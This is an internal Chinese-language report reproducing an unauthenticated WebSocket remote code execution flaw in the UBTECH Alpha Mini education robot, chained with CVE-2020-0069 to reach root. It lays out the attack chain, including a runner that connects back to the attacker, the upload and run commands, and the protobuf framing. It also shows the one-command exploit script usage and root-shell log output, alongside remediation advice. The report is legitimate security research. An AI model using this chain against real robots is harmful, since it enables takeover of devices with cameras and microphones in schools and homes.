---
编号: UBW-004
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选AI悟空EDU
源候选目录: 局域网内未授权WS_RCE漏洞
---
# UBW-004 UBTECH Alpha Mini（悟空 教育版）8801 WebSocket 未授权 RCE → root 提权 漏洞复现报告

## 1. 一句话结论

- # UBTECH Alpha Mini（悟空 教育版）8801 WebSocket 未授权 RCE → root 提权 漏洞复现报告
- \| 涉及发现 \| **U-02**（8800/8801 WebSocket 零鉴权 → 上传执行任意 Python，实机升级为完整 RCE）、**U-20**（CVE-2020-0069 mtk-su → root） \|
- ## 1. 漏洞概述
- - `cmd 8 (PYPI_UPLOAD_SCRIPT_REQUEST)`：上传任意 Python 脚本到
- ⇒ 同网段任意主机可**直接执行任意 Python 代码**，身份为 `u0_a29`（platform_app，

## 2. 影响产品与版本

- \| 目标设备 \| UBTECH Alpha Mini 悟空 国内教育版（`Dedu_<其他机器人设备_01>`） \|
- \| 固件版本 \| `v1.6.3.919`（2023-12，一代最新且已停更） \|
- 机器人 8800/8801 两个端口跑着 TooTallNate Java-WebSocket 服务（官方 Python SDK 的通道），
- 与 U-30（LAN 随机端口 cmd 365 Lua 注入）是**相互独立**的两条 RCE：
- \| 入口 \| LAN 随机端口 cmd 365 \| 固定端口 8801 WebSocket cmd 8/10 \|
- 环境：Python 3.8+（仅标准库），与机器人同网段。

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 详见下方脱敏研究正文和材料清单。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # UBTECH Alpha Mini（悟空 教育版）8801 WebSocket 未授权 RCE → root 提权 漏洞复现报告
- \| 涉及发现 \| **U-02**（8800/8801 WebSocket 零鉴权 → 上传执行任意 Python，实机升级为完整 RCE）、**U-20**（CVE-2020-0069 mtk-su → root） \|
- 配合未修复的内核漏洞 CVE-2020-0069（mtk-su），一步到 **root（uid=0）**。
- ⑤ mtk-su -c id  →  uid=0(root)                                  【U-20 权限提升】
- python exploit_ws.py                 # 全自动，结尾进入交互式 root shell
- ├── exploit_ws.py          # 一键复现主脚本（8801 → RCE → root → 交互 shell）

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# UBTECH Alpha Mini（悟空 教育版）8801 WebSocket 未授权 RCE → root 提权 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | UBTECH Alpha Mini 悟空 国内教育版（`Dedu_<其他机器人设备_01>`） |
| 固件版本 | `v1.6.3.919`（2023-12，一代最新且已停更） |
| 系统 | Android 7.0 / NRD90M，MediaTek MT6755，内核 3.18.35，补丁 2018-05-05 |
| 测试机 | 与机器人同网段的普通 PC（无需任何凭据、无需配对） |
| 复现日期 | 2026-07-29 |
| 涉及发现 | **U-02**（8800/8801 WebSocket 零鉴权 → 上传执行任意 Python，实机升级为完整 RCE）、**U-20**（CVE-2020-0069 mtk-su → root） |
| 授权边界 | 仅对自有设备、在隔离局域网内进行 |

---

## 1. 漏洞概述

机器人 8800/8801 两个端口跑着 TooTallNate Java-WebSocket 服务（官方 Python SDK 的通道），
**WebSocket 升级（101）不需要任何凭据，且 WS 之上的业务消息同样没有任何鉴权**。
其中 8801 是 SDK 的离线包管理通道（`mini/pkg_tool.py`），支持：

- `cmd 8 (PYPI_UPLOAD_SCRIPT_REQUEST)`：上传任意 Python 脚本到
  `/storage/emulated/0/Android/data/com.ubt.pccodemao/files/pyscripts/`
- `cmd 10 (PYPI_RUN_UPLOAD_SCRIPT_REQUEST)`：以 Termux Python 3.8 执行该脚本

⇒ 同网段任意主机可**直接执行任意 Python 代码**，身份为 `u0_a29`（platform_app，
带 audio / camera / media / sdcard_rw / inet 组——即可读写存储、访问麦克风/摄像头、自由联网）。
配合未修复的内核漏洞 CVE-2020-0069（mtk-su），一步到 **root（uid=0）**。

与 U-30（LAN 随机端口 cmd 365 Lua 注入）是**相互独立**的两条 RCE：

| | U-30 | 本文（U-02 升级） |
|---|---|---|
| 入口 | LAN 随机端口 cmd 365 | 固定端口 8801 WebSocket cmd 8/10 |
| 执行体 | SpeechActor LuaJava | CodeMao 起 Termux Python |
| 身份 | system（uid 1000） | u0_a29 |
| 稳定性 | 串行执行器，易卡死 | 实测零失败、秒级 |

## 2. 攻击链

```
攻击者 PC（同网段）
   │  ① TCP 8801 → WebSocket 101 升级（无凭据）
   ▼
② 发 cmd 8 上传 runner.py（protobuf→base64→WS 文本帧，无鉴权）
   │     落盘 /storage/emulated/0/Android/data/com.ubt.pccodemao/files/pyscripts/
   ▼
③ 发 cmd 10 运行 → runner 反连攻击者 → 帧式命令通道
   │     id = uid=10029(u0_a29) …                                【U-02 完整 RCE】
   ▼
④ 经通道写入 mtk-su（MD5 双向校验）
   ▼
⑤ mtk-su -c id  →  uid=0(root)                                  【U-20 权限提升】
```

## 3. 协议细节

- WS 文本帧格式：`base64(Message.SerializeToString()) + "&"`，与 8800（SDK 主通道）同构。
- 信封 `Message{ header{ id=1(string), target=2, command=3 }, bodyData=2 }`。
- 上传请求 `UploadScript{ fileName=1, content=2 }`；响应 `UploadScriptResponse{ resultCode=1, message=2 }`。
- 命令号：8=上传脚本、10=运行脚本、11=停止、12=列表、1=安装 wheel（含 U-17 的
  `pip install ` 拼接注入面）、7=开关 ADB。
- runner 脚本本身即攻击者上传的 Python，反连后按行接收命令、回传 `OUT:<len>\n<bytes>` 帧。

## 4. 复现方法（一键）

环境：Python 3.8+（仅标准库），与机器人同网段。

```bash
cd WS_RCE复现包
python exploit_ws.py                 # 全自动，结尾进入交互式 root shell
python exploit_ws.py --skip-push     # 复用机器人上已有的 mtk-su，跳过传输
python exploit_ws.py --no-shell      # 只验证不进交互 shell（管道下自动如此）
```

约 30 秒完成全链。日志写入 `evidence/exploit_ws_run.log`。

包内文件：

```
WS_RCE复现包/
├── exploit_ws.py          # 一键复现主脚本（8801 → RCE → root → 交互 shell）
├── root_shell.py          # 独立交互式 root shell（日常使用，约 3 秒进入）
├── sig_runner.py          # 机器人侧命令 runner（上传时自动替换回连地址）
├── sig_rootsh.py          # root shell 的机器人侧转发器
├── ws_action.py           # 8800 通道零鉴权动作执行（play/move/stop/list）
├── ws_cmd.py              # 8801 通道基础接口（ws_action/root_shell 依赖）
├── lib/                   # protobuf / mDNS 协议库
├── tools/mtk-su           # CVE-2020-0069 提权程序（aarch64）
├── evidence/              # 运行日志
└── 漏洞复现报告.md        # 本文档
```

## 5. 复现证据

`evidence/exploit_ws_run.log` 关键输出：

```
[+] 101 升级成功，WS 之上无鉴权  ← U-02 实证

$ id
uid=10029(u0_a29) gid=10029(u0_a29) groups=...,1005(audio),1006(camera),...

$ /data/data/com.termux/files/home/mtk-su -c id
uid=0(root) gid=0(root) groups=0(root)

[+] 提权成功：uid=0(root)  ← U-20 实证
```

## 6. 修复建议

1. **8800/8801 两个 WebSocket 通道接入鉴权**：升级握手与业务消息均需设备绑定凭据；
   未鉴权前禁用脚本上传/执行/ADB 开关等高危命令。
2. **脚本执行收敛**：cmd 8/10 应做签名校验或彻底下线远程上传入口；
   `pip install` 拼接（U-17）改为参数数组调用。
3. **内核补丁**：合入 CVE-2020-0069 修复；SELinux 回到 enforcing 并收敛 platform_app 域。
4. 通道启用 TLS 并校验证书，杜绝明文嗅探与中间人。

## 7. 时间线

- 2026-07-28：综合报告将 U-02 记为「101 升级成功，WS 之上鉴权未验证」
- 2026-07-29：实机确认 WS 之上零鉴权，cmd 8/10 上传执行任意 Python → u0_a29；
  配 mtk-su 到 root；U-02 升级为完整 RCE 实机实证
